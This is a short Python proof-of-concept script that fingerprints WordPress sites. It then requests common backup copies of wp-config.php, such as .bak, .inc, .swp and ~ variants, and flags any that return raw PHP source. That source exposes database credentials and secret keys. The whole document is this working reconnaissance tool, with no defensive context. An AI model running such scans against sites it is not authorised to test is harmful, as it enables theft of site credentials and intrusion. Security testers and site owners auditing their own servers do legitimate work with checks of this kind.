import requests

def poc(url):
    if '://' not in url:
        url = 'http://' + url
    if not url.endswith('/'):
        url = url + "/"
    url = url.rstrip("/")
    header = dict()
    header["User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
    r = requests.get(url,headers=header, timeout=10)
    if "/wp-content/themes/" not in r.text:
        return None
    url_lst = ['/wp-config.php.inc',
    '/wp-config.inc',
    '/wp-config.bak',
    '/wp-config.php~',
    '/.wp-config.php.swp',
    '/wp-config.php.bak']

    for payload in url_lst:
        test_url = url + payload
        try:
            r = requests.get(test_url, headers=header)
        except:
            continue
        if r.status_code == 200 and '<?php' in r.text:
            return "[wordpress bak] " + test_url
